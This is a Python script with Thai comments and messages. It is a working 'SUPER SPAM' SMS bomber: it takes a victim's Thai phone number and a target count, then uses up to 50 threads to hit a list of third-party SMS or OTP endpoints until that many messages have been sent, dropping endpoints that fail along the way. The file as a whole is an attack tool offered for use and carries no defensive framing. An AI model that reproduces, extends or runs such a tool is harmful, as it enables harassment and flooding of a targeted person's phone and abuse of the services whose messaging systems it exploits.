# program/SMS-SUPER.py
import requests
import threading
import time
import sys
import random
from API_LIST import API_CONFIG 

# ==========================================
# 🎨 ตั้งค่าสี (Color System)
# ==========================================
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    C_GREEN = Fore.GREEN + Style.BRIGHT
    C_RED = Fore.RED + Style.BRIGHT
    C_YELLOW = Fore.YELLOW + Style.BRIGHT
    C_CYAN = Fore.CYAN + Style.BRIGHT
    C_RESET = Style.RESET_ALL
except ImportError:
    C_GREEN = C_RED = C_YELLOW = C_CYAN = C_RESET = ""

# ==========================================
# ตั้งค่าความแรง
# ==========================================
MAX_THREADS = 50   
TIMEOUT_SEC = 5    
lock = threading.Lock()

success_total = 0
banned_apis = set()

# ... (ฟังก์ชัน clean_phone เหมือนเดิม) ...
def clean_phone(phone):
    phone = "".join(filter(str.isdigit, phone.strip()))
    if phone.startswith("66"): return "0" + phone[2:]
    if phone.startswith("+66"): return "0" + phone[3:]
    return phone

def shoot_api(phone, api_key):
    global success_total
    
    if api_key in banned_apis: return

    cfg = API_CONFIG.get(api_key)
    if not cfg: return

    try:
        url = cfg["url"].format(phone=phone) if "{phone}" in cfg["url"] else cfg["url"]
        headers = cfg["headers"]()
        data_input = cfg["data"](phone) if cfg["data"] else None
        
        kwargs = {"headers": headers, "timeout": TIMEOUT_SEC}
        if isinstance(data_input, dict): kwargs["json"] = data_input
        elif isinstance(data_input, str): kwargs["data"] = data_input

        response = requests.request(cfg["method"], url, **kwargs)
        
        is_success = False
        if response.status_code in (200, 201):
            if cfg["success_check"](response.text): is_success = True
            elif len(response.text) < 500 and "error" not in response.text.lower(): is_success = True

        if is_success:
            with lock:
                success_total += 1
                # ✅ ใส่สีเขียวตอนสำเร็จ
                print(f"{C_GREEN}✅ ส่งสำเร็จครั้งที่ {success_total} | API: {cfg['name']}{C_RESET}")
        else:
            if response.status_code >= 400:
                with lock:
                    if api_key not in banned_apis:
                        # ⚠️ ใส่สีแดงตอน API ตาย
                        print(f"{C_RED}⚠️ API {cfg['name']} ตาย (Status {response.status_code}) -> ตัดทิ้ง!{C_RESET}")
                        banned_apis.add(api_key)

    except Exception:
        with lock:
            if api_key not in banned_apis:
                banned_apis.add(api_key)

def start_super_spam(phone, target_amount):
    # 🚀 ใส่สีฟ้าตอนเริ่ม
    print(f"\n{C_CYAN}🚀 SUPER SPAM V.3 (Guaranteed Success) ไปที่: {phone}{C_RESET}")
    print(f"{C_CYAN}🎯 เป้าหมายความสำเร็จ: {target_amount} ครั้ง{C_RESET}")
    print(f"{C_YELLOW}" + "-" * 50 + f"{C_RESET}")

    all_api_keys = list(API_CONFIG.keys())
    threads = []
    attempt_count = 0 
    
    while success_total < target_amount:
        active_apis = [k for k in all_api_keys if k not in banned_apis]
        
        if not active_apis:
            print(f"\n{C_RED}❌ ไม่มี API ที่ใช้งานได้เหลืออยู่เลย! ระบบจำเป็นต้องหยุด{C_RESET}")
            break

        api_key = active_apis[attempt_count % len(active_apis)]
        t = threading.Thread(target=shoot_api, args=(phone, api_key))
        threads.append(t)
        t.start()
        attempt_count += 1

        threads = [t for t in threads if t.is_alive()]
        while len(threads) >= MAX_THREADS:
            time.sleep(0.1)
            threads = [t for t in threads if t.is_alive()]
        
        time.sleep(0.02)

    for t in threads: t.join()

    print(f"{C_YELLOW}" + "-" * 50 + f"{C_RESET}")
    print(f"{C_GREEN}🏁 ภารกิจเสร็จสิ้นสมบูรณ์!{C_RESET}")
    print(f"✅ ยอดสำเร็จ: {C_GREEN}{success_total}/{target_amount}{C_RESET}")
    print(f"🔁 พยายามยิงทั้งหมด: {attempt_count}")
    print(f"⚠️ API ที่ตาย: {C_RED}{len(banned_apis)}{C_RESET}")
    print(f"{C_YELLOW}" + "-" * 50 + f"{C_RESET}")

if __name__ == "__main__":
    try:
        # ใส่สีตอนรับ input
        phone_input = input(f"{C_YELLOW}📱 เบอร์โทรศัพท์: {C_RESET}")
        clean_p = clean_phone(phone_input)
        
        if len(clean_p) != 10:
            print(f"{C_RED}❌ เบอร์ไม่ถูกต้อง{C_RESET}")
            sys.exit()

        amount_input = input(f"{C_YELLOW}🔢 จำนวนความสำเร็จที่ต้องการ: {C_RESET}")
        amount = int(amount_input)

        start_super_spam(clean_p, amount)
        
    except ValueError:
        print(f"{C_RED}❌ ใส่ตัวเลขเท่านั้น{C_RESET}")
    except KeyboardInterrupt:
        print(f"\n{C_RED}⛔ ยกเลิก{C_RESET}")
